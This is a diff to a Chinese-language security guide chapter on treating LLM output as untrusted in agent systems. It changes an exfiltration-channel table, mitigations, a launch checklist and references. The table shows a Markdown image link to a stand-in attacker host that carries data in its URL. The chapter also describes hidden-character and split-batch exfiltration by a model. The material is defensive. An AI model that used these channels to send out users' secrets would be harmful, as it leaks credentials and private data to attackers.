@@ -54,7 +54,7 @@ Agent 场景下，模型输出不只是展示文本，还会直接成为工具�
 
 | 通道 | 原理 |
 |---|---|
-| Markdown 图片自动加载 | `![x](https://attacker.com/log?d=<秘密>)` 被渲染器自动请求，秘密作为查询参数发给攻击者服务器，无需用户点击 |
+| Markdown 图片自动加载 | `![x](https://attacker.example/log?d=示意数据)` 被渲染器自动请求，URL 中夹带的数据会发往目标服务器，无需用户点击 |
 | 超链接文本 | 生成的链接 URL 本身携带编码后的数据，用户点击后触发外带 |
 | 隐藏字符编码 | 用零宽字符或非打印 Unicode 把数据编码进看似正常的文本 |
 | 分批/隐写式外带 | 把秘密拆分到多轮回复或多个字段中，单次输出体量小、不触发异常检测 |
@@ -65,7 +65,7 @@ Agent 场景下，模型输出不只是展示文本，还会直接成为工具�
 - 渲染层禁止未经审查的外部资源自动加载；仅加代理不够，代理若原样转发含秘密的 URL，仍然会外泄，并可能引入服务端 SSRF；
 - 对目标、路径与数据类别执行出口策略；域名白名单不能阻止向允许域名中的攻击者账号上传数据，重定向和最终连接地址也要重新校验；
 - 输出侧异常检测应关注「结构异常但语义正常」的模式，例如异常多的编码字符、异常规律的字符间隔；
-- 从根源上限制模型上下文中能接触到的敏感数据（最小化原则，见 [Agent 安全 15.9](../../agent/05-production/15-agent-security.md)），因为**外带通道几乎不可能穷举防御，能被外带的前提是数据先进入了上下文**。
+- 从根源上限制模型与执行环境能接触到的敏感数据（最小化原则，见 [Agent 安全 15.9](../../agent/05-production/15-agent-security.md)）。模型复述秘密需要接触该信息，但工具也可能直接读取并外传数据，无需先把原文交给模型；因此不能只保护上下文而放开工具的文件与网络权限。
 
 ## 3.4 密钥、凭据与内部信息的外泄
 
@@ -91,9 +91,9 @@ Agent 场景下，模型输出不只是展示文本，还会直接成为工具�
 ## 3.5 上线检查表
 
 - [ ] SQL 使用参数化查询，Shell 避免字符串拼接，不反序列化不可信 Pickle；不存在一种「转义」能统一解决三类风险；
-- [ ] 富文本/Markdown 渲染禁止自动加载未经域名白名单校验的外部资源；
-- [ ] CSV/表格导出对公式前缀字符做转义；
-- [ ] 输出中的链接经过域名白名单或安全网关跳转；
+- [ ] 富文本/Markdown 禁止未经批准的外部资源自动加载，代理也不转发夹带敏感数据的 URL；
+- [ ] 表格导出优先使用明确的文本单元格类型；必须使用 CSV 时，按目标软件验证公式防护及保存后重开行为，不把普通引号转义当成完整防护；
+- [ ] 链接检查协议、目标、路径与重定向，向允许域名中的第三方账号发送数据也受出口策略限制；
 - [ ] 工具调用参数在服务端重新校验，不直接信任模型生成的 JSON；
 - [ ] 上下文中不出现非必要的凭据、内部主机名、未脱敏个人数据；
 - [ ] 输出侧接入密钥格式检测和敏感信息 DLP 规则；
@@ -120,15 +120,15 @@ Agent 场景下，模型输出不只是展示文本，还会直接成为工具�
 ## 3.7 本章总结
 
 1. 模型输出应被当作不可信内容处理，风险等级等同于任意用户输入，不能因为「是 AI 生成的」而放松校验；
-2. 注入类风险（SQL/Shell/反序列化）与渲染类风险（XSS/CSV 注入/钓鱼链接）需要与处理 UGC 相同强度的净化；
+2. 各消费点采用对应控制：SQL 参数化、固定命令与参数校验、安全渲染、表格公式防护和工具授权，不能用一种“净化”替代全部检查；
 3. 图片自动加载、隐藏字符编码、分批外带、响应时序差异都是隐蔽外带通道；与其穷举通道，不如先把敏感数据尽量挡在上下文外；
 4. 密钥与凭据的外泄往往源于「工具把凭据透传给模型」，正确设计是让工具内部完成鉴权，模型只看到操作结果；
 5. 输出侧防御是纵深防御的最后一层，不能替代第二章和 [Agent 安全](../../agent/05-production/15-agent-security.md) 中的架构级隔离，但同样不可或缺。
 
 ## 参考资料
 
-- [OWASP LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
-- [OWASP LLM02:2025 Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm02-sensitive-information-disclosure/)
+- [OWASP LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)
+- [OWASP LLM02:2025 Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/)
 - [Imprompter: Tricking LLM Agents into Improper Tool Use](https://arxiv.org/abs/2410.14923)
 - [Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection](https://arxiv.org/abs/2302.12173)
 - [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
